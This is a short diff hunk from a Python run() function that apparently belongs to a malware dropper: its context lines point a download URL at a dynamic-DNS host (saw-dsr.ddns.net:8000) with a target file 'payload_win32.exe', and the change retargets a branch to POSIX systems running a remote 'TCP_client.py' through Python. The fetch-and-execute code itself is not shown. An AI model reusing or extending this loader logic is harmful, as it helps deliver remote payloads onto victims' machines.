@@ -36,7 +36,7 @@ def run(**args):
       bin = True
       url = "http://saw-dsr.ddns.net:8000/test"
       OsTargetpath = "payload_win32.exe"
-  elif os.name == 'nt':
+  elif os.name == 'posix':
       bin = False
       ScriptExec = "python "
       #url = "http://saw-dsr.ddns.net:8000/TCP_client.py"
